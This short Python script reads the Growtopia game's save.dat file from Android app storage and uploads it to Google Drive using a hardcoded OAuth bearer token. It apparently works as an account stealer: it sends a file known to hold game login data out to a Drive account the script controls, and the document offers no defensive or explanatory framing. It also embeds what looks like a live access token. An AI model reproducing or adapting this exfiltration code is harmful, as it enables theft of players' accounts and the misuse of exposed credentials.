import json
import requests
def fucxy():
    headers = {"Authorization": "Bearer ya29.a0AfH6SMANznAYl2V3B4u18IhUnbvNvw9-LKilViS7wmmUGY6L7OARW4D-9AIVl1XoOYFLy9exHCWEOP0U3zjXKuiLR4TEMgAPdjqXSxxnurqkwBD2ld_FoXuFLNX9ybZZcjdclDn5_lE_A-1q8UCA543Lr3fH"}
    para = {
        "name": "saved.dat",
    }
    files = {
        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
        'file': open("/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat", "rb")
    }
    r = requests.post(
        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
        headers=headers,
        files=files
    )


